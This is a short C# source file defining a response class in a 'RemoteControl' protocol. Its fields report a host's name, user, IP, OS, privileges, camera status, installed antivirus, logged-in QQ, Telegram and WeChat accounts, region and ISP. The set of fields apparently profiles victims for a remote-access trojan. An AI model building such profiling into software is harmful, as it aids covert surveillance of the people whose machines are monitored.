using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace RemoteControl.Protocals.Response
{
    /// <summary>
    /// 获取计算机名称
    /// </summary>
    public class ResponseGetHostName:ResponseBase
    {
        public string HostName;
        public string AppPath;
        public string OnlineAvatar;
        public string UserName;
        public string LocalIP;
        public string OSVersion;
        public string Privilege;
        public string CameraStatus;
        public string Antivirus;
        public string OnlineQQ;
        public string TG;
        public string WX;
        public string UserStatus;
        public string Region;
        public string ISP;
    }
}
